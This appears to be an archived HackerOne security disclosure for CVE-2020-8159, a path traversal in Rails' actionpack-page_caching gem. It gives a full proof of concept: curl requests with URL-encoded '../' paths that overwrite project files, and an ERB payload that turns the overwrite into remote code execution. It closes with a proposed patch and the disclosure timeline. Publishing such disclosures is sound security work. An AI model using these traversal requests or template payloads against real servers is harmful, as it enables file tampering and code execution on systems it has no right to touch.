---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/ruby
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2020-07-13
submitted: 2019-03-31T07:25:13.608Z
bounty_usd: 1000
votes: 80
cve: "CVE-2020-8159"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "ooooooo_q"
source: "https://hackerone.com/reports/519220"
title: "File writing by Directory traversal at actionpack-page_caching and RCE by it"
---
# File writing by Directory traversal at actionpack-page_caching and RCE by it

> **Severity:** High | **Bounty:** 1,000 USD | **Votes:** 80 | **Program:** Ruby on Rails | **Disclosed:** 2020-07-13

- Report: [https://hackerone.com/reports/519220](https://hackerone.com/reports/519220)
- CWE: Path Traversal | CVE: CVE-2020-8159
- Submitted: 2019-03-31T07:25:13.608Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I found a directory traversal in `actionpack-page_caching`.
Some code may lead to RCE.


https://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143

```ruby
  def cache_file(path, extension)
    if path.empty? || path =~ %r{\A/+\z}
      name = "/index"
    else
      name = URI.parser.unescape(path.chomp("/"))
    end

    if File.extname(name).empty?
      name + (extension || default_extension)
    else
      name
    end
  end

  def cache_path(path, extension = nil)
    File.join(cache_directory, cache_file(path, extension))
  end
```

The problem is that traversal is not considered in cache_path or cache_file.
Since the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.

### PoC

#### step 1. Prepare server

```log
ruby -v

rails -v

rails new caching_traversal

cd caching_traversal

# add `gem "actionpack-page_caching"` in Gemfile

bundle install

rails generate scaffold book name:string
rails db:migrate
```

#### step 2. Setting cache

Enable caching.

```log
rails dev:cache
```

Add `caches_page`.

```ruby
# app/controllers/books_contorller.rb
class BooksController < ApplicationController
  before_action :set_book, only: [:show, :edit, :update, :destroy]

  caches_page :show
```

#### step 3. Start server

Start the server with "rails s".

Prepare a book with the following name.

```
<% `toouch me` %>
```


Check cache behavior.

```log
❯ curl "http://localhost:3000/books/1"
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

❯ ls public
404.html  500.html                          apple-touch-icon.png  favicon.ico
422.html  apple-touch-icon-precomposed.png  books                 robots.txt

❯ cat public/books/1.html
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

```


#### step 4. Attack 

Add an attack code to the pass and check the result.

```log
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    README.md  test       tmp
bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat README.md
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

#### step 5. RCE

RCE is possible if it is possible to create a cache where the value of `<%` is not escaped, like render for text.

Generate the file `app/views/books/show.text.erb` as follows:


```
name: <%= @ book.name %>
```

Overwriting erb files enables RCE.

```log
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp
```

## Impact

The cache is generated on an unintended path. Also, RCE may be possible.

## Timeline

- **Report Filed**
- **2019-03-31** @matthewd: Ughh, nice find!

Looks like this was introduced in https://github.com/rails/rails/commit/d4576673c0c8d39f89e9798ab89b2c475a9f5f85, to fix https://web.archive.org/web/20070303040451/http://dev.rubyonrails.org:80/ticket/1877, care of https://web.archive.org/web/20051112005838/http://typo.leetsoft.com/trac/ticket/249.

> There may be security implications if the encoded URL contains url-encoded ../../../..-type things. I suspect (but have not tested) that the web server will block most, if not all, of these.

😬😬😬
- **2019-05-28** @ooooooo_q: @matthewd Any updates?
- **2019-06-11** @ooooooo_q: @rails Any updates?
- **2019-08-29** @ooooooo_q: @rails Any updates?
- **2019-09-08** @ooooooo_q: Suggestion for correction.

```
--- a/lib/action_controller/caching/pages.rb
+++ b/lib/action_controller/caching/pages.rb
@@ -145,6 +145,7 @@ module ActionController
               name = "/index"
             else
               name = URI.parser.unescape(path.chomp("/"))
+              name = Rack::Utils::clean_path_info(name)
             end

             if File.extname(name).empty?
```
- **2019-10-19** @ooooooo_q: @matthewd @rails
How about the above correction?
- **2019-12-30** @h1_analyst_chanel: Hey @ooooooo_q

Thank you for your heavy patience on this report. I have asked the internal team about this and will get back to you one we have an update.

We apologize for the lack of information to you. 
@chinch1lla
- **2020-04-19** @ooooooo_q: @chinch1lla 
Any updates? Or should I make an issue on Github?
- **2020-04-21** @h1_analyst_jack: I asked for an update. Let's see if they respond.

Thanks and regards,
@golden__retriever
- **Cve Id Added**
- **Report Resolved**
- **2020-05-17** @ooooooo_q: @tenderlove 
hello,
I confirmed it was fixed in 1.2.2.

Is it possible to upgrade the version at rails-contributors?
https://github.com/rails/rails-contributors/blob/master/Gemfile.lock#L28

After confirming that it has been applied, I request a disclose for this report.
- **2020-06-06** @ooooooo_q: I found another attack pattern on https://github.com/rails/rails-contributors

For paths where `(.format)` is supported, it was possible to embed an attack in the format with `..` as `%2e%2e` as follows:

```
curl "http://localhost:3000/faq.%2f%2e%2e%2f%2e%2e%2ftest"
-> test file is generated in root
```
- **Agreed On Going Public**
- **Report Became Public**
- **2020-10-24** @ooooooo_q: @tenderlove 
Is this report within the scope of Rails bounty?
- **Bounty Awarded**
